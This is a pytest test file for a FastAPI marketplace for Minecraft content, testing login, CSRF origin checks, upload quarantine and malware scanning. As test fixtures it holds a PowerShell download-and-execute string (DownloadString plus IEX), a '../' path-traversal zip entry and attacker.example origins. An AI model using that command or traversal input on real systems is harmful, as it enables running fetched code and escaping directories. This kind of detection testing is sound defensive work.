from io import BytesIO
import asyncio
from dataclasses import replace
import hashlib
import re
import struct
import zlib
from zipfile import ZIP_DEFLATED, ZipFile

import pytest
from fastapi.testclient import TestClient

from app.config import settings
from app.database import Base, SessionLocal, engine
from app.main import RATE_LIMITS, app
from app.models import DeveloperProfile, ReleaseFile, User
from app.security import hash_password


@pytest.fixture
def client():
    RATE_LIMITS.clear()
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)
    with TestClient(app) as test_client:
        yield test_client


def register_and_login(client: TestClient, email="builder@example.com", username="builder"):
    response = client.post(
        "/api/auth/register",
        json={"email": email, "username": username, "password": "correct horse battery"},
    )
    assert response.status_code == 201
    response = client.post(
        "/api/auth/login",
        json={"email": email, "password": "correct horse battery"},
    )
    assert response.status_code == 200
    return response.json()["csrf_token"]


def small_png():
    def chunk(name: bytes, payload: bytes) -> bytes:
        contents = name + payload
        return (
            struct.pack("!I", len(payload))
            + contents
            + struct.pack("!I", zlib.crc32(contents) & 0xFFFFFFFF)
        )

    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack("!II", 1, 1) + bytes([8, 2, 0, 0, 0]))
        + chunk(b"IDAT", zlib.compress(b"\0\xff\0\0"))
        + chunk(b"IEND", b"")
    )


def test_registration_login_session_and_logout(client: TestClient):
    csrf = register_and_login(client)
    assert client.get("/api/auth/me").json()["username"] == "builder"
    assert client.post("/api/auth/logout").status_code == 403
    response = client.post("/api/auth/logout", headers={"X-CSRF-Token": csrf})
    assert response.status_code == 200
    assert client.get("/api/auth/me").status_code == 401


def test_password_change_requires_current_password_and_keeps_only_active_session(client: TestClient):
    csrf = register_and_login(client)
    invalid = client.patch(
        "/api/auth/password",
        json={"current_password": "incorrect password", "new_password": "a new correct horse battery"},
        headers={"X-CSRF-Token": csrf},
    )
    assert invalid.status_code == 400
    changed = client.patch(
        "/api/auth/password",
        json={"current_password": "correct horse battery", "new_password": "a new correct horse battery"},
        headers={"X-CSRF-Token": csrf},
    )
    assert changed.status_code == 200
    assert client.get("/api/auth/me").status_code == 200
    assert client.post("/api/auth/logout", headers={"X-CSRF-Token": csrf}).status_code == 200
    assert client.post(
        "/api/auth/login",
        json={"email": "builder@example.com", "password": "correct horse battery"},
    ).status_code == 401
    assert client.post(
        "/api/auth/login",
        json={"email": "builder@example.com", "password": "a new correct horse battery"},
    ).status_code == 200


def test_email_verification_and_password_reset_tokens_are_single_use(client: TestClient, monkeypatch):
    import app.auth_routes as auth_routes

    sent_messages = []
    monkeypatch.setattr(
        auth_routes,
        "settings",
        replace(auth_routes.settings, smtp_host="smtp.example.test"),
    )
    monkeypatch.setattr(
        auth_routes,
        "send_account_email",
        lambda recipient, subject, body: sent_messages.append((recipient, subject, body)),
    )

    registered = client.post(
        "/api/auth/register",
        json={
            "email": "verified@example.com",
            "username": "verified",
            "password": "correct horse battery",
        },
    )
    assert registered.status_code == 201
    assert registered.json()["verification_email_sent"] is True
    verification_token = re.search(r"[A-Za-z0-9_-]{50,}", sent_messages[-1][2]).group()
    verified = client.post("/api/auth/verify-email", json={"token": verification_token})
    assert verified.status_code == 200
    assert client.post("/api/auth/verify-email", json={"token": verification_token}).status_code == 400
    assert client.post(
        "/api/auth/login",
        json={"email": "verified@example.com", "password": "correct horse battery"},
    ).status_code == 200

    reset_requested = client.post(
        "/api/auth/password-reset/request",
        json={"email": "verified@example.com"},
    )
    assert reset_requested.status_code == 200
    reset_token = re.search(r"[A-Za-z0-9_-]{50,}", sent_messages[-1][2]).group()
    reset = client.post(
        "/api/auth/password-reset/confirm",
        json={"token": reset_token, "password": "a new correct horse battery"},
    )
    assert reset.status_code == 200
    assert client.get("/api/auth/me").status_code == 401
    assert client.post(
        "/api/auth/password-reset/confirm",
        json={"token": reset_token, "password": "another correct horse battery"},
    ).status_code == 400
    assert client.post(
        "/api/auth/login",
        json={"email": "verified@example.com", "password": "a new correct horse battery"},
    ).status_code == 200


def test_private_routes_and_csrf_origin_are_enforced(client: TestClient, monkeypatch):
    import app.security as security

    assert client.get("/api/account/downloads").status_code == 401
    token = register_and_login(client)
    monkeypatch.setattr(
        security,
        "settings",
        replace(security.settings, allowed_origins=("https://modstation.example",)),
    )
    private = client.get("/api/account/downloads")
    assert private.status_code == 200
    blocked = client.post(
        "/api/auth/developer",
        json={"display_name": "Builder"},
        headers={"X-CSRF-Token": token, "Origin": "https://attacker.example"},
    )
    assert blocked.status_code == 403
    accepted = client.post(
        "/api/auth/developer",
        json={"display_name": "Builder"},
        headers={"X-CSRF-Token": token, "Origin": "https://modstation.example"},
    )
    assert accepted.status_code == 200


def test_csrf_token_can_be_refreshed_for_a_cross_origin_frontend(client: TestClient, monkeypatch):
    import app.security as security

    old_token = register_and_login(client)
    monkeypatch.setattr(
        security,
        "settings",
        replace(security.settings, allowed_origins=("https://modstation.example",)),
    )
    refreshed = client.post(
        "/api/auth/csrf",
        headers={"Origin": "https://modstation.example"},
    )
    assert refreshed.status_code == 200
    new_token = refreshed.json()["csrf_token"]
    assert new_token != old_token
    assert client.post(
        "/api/auth/developer",
        json={"display_name": "Builder"},
        headers={"X-CSRF-Token": old_token, "Origin": "https://modstation.example"},
    ).status_code == 403
    assert client.post(
        "/api/auth/developer",
        json={"display_name": "Builder"},
        headers={"X-CSRF-Token": new_token, "Origin": "https://modstation.example"},
    ).status_code == 200
    assert client.post(
        "/api/auth/csrf",
        headers={"Origin": "https://attacker.example"},
    ).status_code == 403


def test_smtp_is_required_for_password_recovery(client: TestClient):
    response = client.post(
        "/api/auth/password-reset/request",
        json={"email": "nobody@example.com"},
    )
    assert response.status_code == 503


def test_registration_rejects_weak_password(client: TestClient):
    response = client.post(
        "/api/auth/register",
        json={        "email": "weak@example.com", "username": "weakuser", "password": "short"},
    )
    assert response.status_code == 422


def test_admin_routes_enforce_roles_and_public_frontend_is_served(client: TestClient):
    csrf = register_and_login(client)
    assert client.get("/").status_code == 200
    assert client.get("/assets/app.js").status_code == 200
    assert client.get("/api/health").json() == {"status": "ok"}
    assert client.get("/api/admin/overview").status_code == 403
    assert client.post(
        "/api/auth/developer",
        json={"display_name": "Builder"},
    ).status_code == 403
    assert csrf


def test_archive_structure_rejects_path_traversal(tmp_path):
    from app.mse import _inspect_archive

    archive_path = tmp_path / "unsafe.zip"
    with ZipFile(archive_path, "w") as archive:
        archive.writestr("../outside.txt", "not extracted")
    result = _inspect_archive(archive_path, "unsafe.zip")
    assert result["status"] == "suspicious"
    assert result["reason"] == "unsafe_archive_paths"


def test_private_storage_round_trip(tmp_path, monkeypatch):
    import app.storage as storage_module

    monkeypatch.setattr(
        storage_module,
        "settings",
        replace(
            storage_module.settings,
            storage_root=tmp_path / "approved",
            quarantine_root=tmp_path / "quarantine",
        ),
    )
    private_storage = storage_module.PrivateStorage()
    private_storage.put_quarantine("round-trip", b"approved after scan")
    with private_storage.scan_quarantine("round-trip") as path:
        assert path is not None
        assert path.read_bytes() == b"approved after scan"
    assert private_storage.approve("round-trip")
    assert private_storage.read_approved("round-trip") == b"approved after scan"


def test_private_storage_cannot_contain_or_be_inside_web_root(tmp_path, monkeypatch):
    import app.main as main

    private_root = tmp_path / "private"
    monkeypatch.setattr(main, "WEB_ROOT", private_root / "web")
    monkeypatch.setattr(
        main,
        "settings",
        replace(
            main.settings,
            storage_root=private_root,
            quarantine_root=tmp_path / "quarantine",
        ),
    )

    async def start_application():
        async with main.lifespan(None):
            pass

    with pytest.raises(RuntimeError, match="Private file directories"):
        asyncio.run(start_application())


@pytest.mark.parametrize(
    ("response", "expected"),
    [
        (b"stream: OK\0", "clean"),
        (b"stream: Eicar-Test-Signature FOUND\0", "threat"),
    ],
)
def test_clamav_instream_responses_are_parsed(tmp_path, monkeypatch, response, expected):
    import app.mse as mse

    class FakeSocket:
        def __init__(self):
            self.responses = [response]
            self.sent = []

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return None

        def settimeout(self, _timeout):
            return None

        def sendall(self, data):
            self.sent.append(data)

        def recv(self, _size):
            return self.responses.pop(0) if self.responses else b""

    fake_socket = FakeSocket()
    monkeypatch.setattr(mse.socket, "create_connection", lambda *_args, **_kwargs: fake_socket)
    sample = tmp_path / "sample.jar"
    sample.write_bytes(b"archive bytes")

    result = mse._clamav_scan(sample)

    assert result["status"] == expected
    assert fake_socket.sent[0] == b"zINSTREAM\0"
    assert fake_socket.sent[-1] == b"\0\0\0\0"


def test_clamav_rejects_malformed_clean_response(tmp_path, monkeypatch):
    import app.mse as mse

    class FakeSocket:
        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return None

        def settimeout(self, _timeout):
            return None

        def sendall(self, _data):
            return None

        def recv(self, _size):
            return b"attacker-controlled OK\0"

    monkeypatch.setattr(mse.socket, "create_connection", lambda *_args, **_kwargs: FakeSocket())
    sample = tmp_path / "sample.jar"
    sample.write_bytes(b"archive bytes")
    with pytest.raises(RuntimeError, match="invalid INSTREAM"):
        mse._clamav_scan(sample)


def test_scanner_unavailability_is_inconclusive(tmp_path, monkeypatch):
    import app.mse as mse

    sample = tmp_path / "sample.zip"
    with ZipFile(sample, "w") as archive:
        archive.writestr("readme.txt", "a harmless resource pack")
    monkeypatch.setattr(mse, "_clamav_scan", lambda _path: (_ for _ in ()).throw(ConnectionRefusedError()))
    monkeypatch.setattr(mse, "_yara_scan", lambda *_args: {"status": "clean", "engine": "yara"})
    monkeypatch.setattr(mse, "_virustotal_scan", lambda _sha256: None)

    result = mse.scan_file(sample, "sample.zip", "0" * 64)

    assert result.status == "inconclusive"
    assert result.results["scanner_errors"]["clamav"]["message"] == "Scanner service is unavailable"


def test_yara_rules_detect_combined_behavior_without_matching_generic_documentation(tmp_path):
    from app.mse import _yara_scan

    harmless = tmp_path / "harmless.zip"
    with ZipFile(harmless, "w") as archive:
        archive.writestr("readme.txt", "Documentation mentions DownloadString and IEX as terms.")
    suspicious = tmp_path / "suspicious.zip"
    with ZipFile(suspicious, "w") as archive:
        archive.writestr(
            "payload.txt",
            "powershell.exe $client.DownloadString('https://example.invalid'); IEX($client)",
        )

    harmless_result = _yara_scan(harmless, "harmless.jar")
    suspicious_result = _yara_scan(suspicious, "suspicious.jar")

    assert harmless_result["status"] == "clean"
    assert suspicious_result["status"] == "suspicious"
    assert "Suspicious_PowerShell_Download_And_Execution" in suspicious_result["matches"]


def test_upload_without_security_scanners_never_reaches_publication(client: TestClient):
    token = register_and_login(client)
    with SessionLocal() as db:
        user = db.query(User).filter_by(username="builder").one()
        user.role = "developer"
        user.email_verified = True
        db.add(DeveloperProfile(user_id=user.id, display_name="Builder"))
        db.commit()
    payload = {
        "name": "Starter map",
        "description": "A carefully crafted starting map for an adventure with friends.",
        "category": "maps",
        "edition": "java",
        "minecraft_version": "1.21",
        "license": "All Rights Reserved",
    }
    created = client.post(
        "/api/contents",
        json=payload,
        headers={"X-CSRF-Token": token},
    )
    assert created.status_code == 201
    content_url = f"/api/contents/{created.json()['id']}/files?version=1.0.0"
    assert client.post(
        content_url,
        files={"upload": ("payload.exe", b"not an archive", "application/octet-stream")},
        headers={"X-CSRF-Token": token},
    ).status_code == 415
    assert client.post(
        content_url,
        files={"upload": ("payload.zip", b"not an archive", "text/plain")},
        headers={"X-CSRF-Token": token},
    ).status_code == 415
    assert client.post(
        content_url,
        files={
            "upload": (
                "oversized.zip",
                b"x" * (settings.max_upload_bytes + 1),
                "application/zip",
            )
        },
        headers={"X-CSRF-Token": token},
    ).status_code == 413
    archive = BytesIO()
    with ZipFile(archive, "w", ZIP_DEFLATED) as zipped:
        zipped.writestr("pack.mcmeta", '{"pack":{"pack_format":1,"description":"test"}}')
    archive_bytes = archive.getvalue()
    invalid_archive = client.post(
        content_url,
        files={"upload": ("invalid.zip", b"not actually a zip", "application/zip")},
        headers={"X-CSRF-Token": token},
    )
    assert invalid_archive.status_code == 202
    with SessionLocal() as db:
        rejected_structure = db.get(ReleaseFile, invalid_archive.json()["id"])
        assert rejected_structure is not None
        assert rejected_structure.scan_status == "suspicious"
    uploaded = client.post(
        content_url,
        files={"upload": ("starter.zip", archive_bytes, "application/zip")},
        headers={"X-CSRF-Token": token},
    )
    assert uploaded.status_code == 202
    file_id = uploaded.json()["id"]
    assert uploaded.json()["sha256"] == hashlib.sha256(archive_bytes).hexdigest()
    with SessionLocal() as db:
        stored_release = db.get(ReleaseFile, file_id)
        assert stored_release is not None
        assert (settings.quarantine_root / f"{stored_release.storage_key}.blob").is_file()
        assert client.get(f"/quarantine/{stored_release.storage_key}.blob").status_code == 404
        assert client.get(f"/storage/{stored_release.storage_key}.blob").status_code == 404
    RATE_LIMITS.clear()
    image_url = f"/api/contents/{created.json()['id']}/images"
    assert client.post(
        image_url,
        files={"upload": ("cover.png", small_png(), "text/plain")},
        headers={"X-CSRF-Token": token},
    ).status_code == 415
    assert client.post(
        image_url,
        files={"upload": ("cover.png", b"not png", "image/png")},
        headers={"X-CSRF-Token": token},
    ).status_code == 400
    uploaded_image = client.post(
        image_url,
        files={"upload": ("cover.png", small_png(), "image/png")},
        headers={"X-CSRF-Token": token},
    )
    assert uploaded_image.status_code == 202
    own_contents = client.get("/api/developer/contents").json()
    release = next(item for item in own_contents[0]["files"] if item["file_type"] == "archive")
    assert release["scan_status"] == "inconclusive"
    image = next(item for item in own_contents[0]["files"] if item["file_type"] == "image")
    assert image["scan_status"] == "inconclusive"
    submitted = client.post(
        f"/api/contents/{created.json()['id']}/submit",
        headers={"X-CSRF-Token": token},
    )
    assert submitted.status_code == 409
    assert client.get(f"/api/files/{file_id}/download").status_code == 404
    assert client.get(f"/api/images/{uploaded_image.json()['id']}").status_code == 404


def test_catalog_does_not_expose_unpublished_content(client: TestClient):
    with SessionLocal() as db:
        user = User(
            email="hidden@example.com",
            username="hidden",
            password_hash=hash_password("correct horse battery"),
            role="developer",
        )
        db.add(user)
        db.flush()
        db.add(DeveloperProfile(user_id=user.id, display_name="Hidden"))
        from app.models import Content

        db.add(
            Content(
                owner_id=user.id,
                name="Private draft",
                slug="private-draft",
                description="This draft should not be listed in the public catalog.",
                category="mods",
                edition="java",
                minecraft_version="1.21",
                license="MIT",
                status="draft",
            )
        )
        db.commit()
    assert client.get("/api/contents").json()["total"] == 0
    assert client.get("/api/contents/private-draft").status_code == 404
